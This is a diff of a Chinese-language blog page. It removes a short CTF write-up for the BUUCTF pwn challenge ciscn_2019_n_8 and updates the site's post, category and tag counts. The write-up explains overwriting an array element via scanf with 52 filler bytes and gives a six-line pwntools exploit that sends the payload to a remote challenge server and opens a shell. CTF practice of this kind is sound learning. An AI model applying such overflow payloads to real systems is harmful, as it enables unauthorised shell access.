-                  <a href="/categories/buu/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="/2021/06/15/buu-ciscn-2019-n-8/ida.png"></p>
-<blockquote>
-<p>var类型为DWORD(四个字节)</p>
-</blockquote>
-<p>只要通过scanf将var[13]覆盖为’\x11’即可getshell，var为DWORD(int)类型占四个字节，scanf输入的是char类型占一个字节。所以要覆盖var[13]，需要13*4=52个字符(52字节)</p>
-<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="直接wp"><a href="#直接wp" class="headerlink" title="直接wp"></a>直接wp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh=process(&quot;./ciscn_2019_n_8&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27113</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">52</span>+<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1259,20 +1328,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
